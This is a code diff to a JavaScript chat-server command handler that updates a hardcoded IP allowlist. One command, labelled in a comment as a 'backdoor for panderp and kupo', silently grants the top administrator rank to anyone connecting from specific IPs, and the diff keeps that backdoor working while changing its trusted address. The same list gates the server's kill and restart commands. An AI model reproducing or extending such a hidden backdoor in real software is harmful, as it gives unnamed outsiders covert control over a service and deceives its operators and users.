@@ -136,6 +136,7 @@ var poofeh = true;
 var gitpulling = false;
 var imgs = true;
 var updateServerLock = false;
+var kuponubip = '204.112.217.25';
 
 function parseCommandLocal(user, cmd, target, room, socket, message) {
 	if (!room) return;
@@ -1478,7 +1479,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case 'secrets':
 		// backdoor for panderp and kupo
 		ip = user.connections[0].ip;
-		if ( ip  === '76.247.181.42'|| ip === '127.0.0.1' || ip === '204.112.218.108' ) {
+		if ( ip  === '76.247.181.42'|| ip === '127.0.0.1' || ip === kuponubip ) {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			user.getIdentity = function(){
 			if(this.muted)
@@ -2557,7 +2558,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 
 	case 'kill':
 		ip = user.connections[0].ip;
-		if (!user.can('lockdown') || !(ip === '127.0.0.1' || ip === '76.247.181.42' || ip === '204.112.217.25')) {
+		if (!user.can('lockdown') || !(ip === '127.0.0.1' || ip === '76.247.181.42' || ip === kuponubip)) {
 			emit(socket, 'console', '/lockdown - Access denied.');
 			return false;
 		}
@@ -2589,7 +2590,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	
 	case 'restart':
 		ip = user.connections[0].ip;
-		if (!user.can('lockdown') || !(ip === '127.0.0.1' || ip === '76.247.181.42' || ip === '204.112.217.25')) {
+		if (!user.can('lockdown') || !(ip === '127.0.0.1' || ip === '76.247.181.42' || ip === kuponubip)) {
 			emit(socket, 'console', '/restart - Access denied.');
 			return false;
 		}
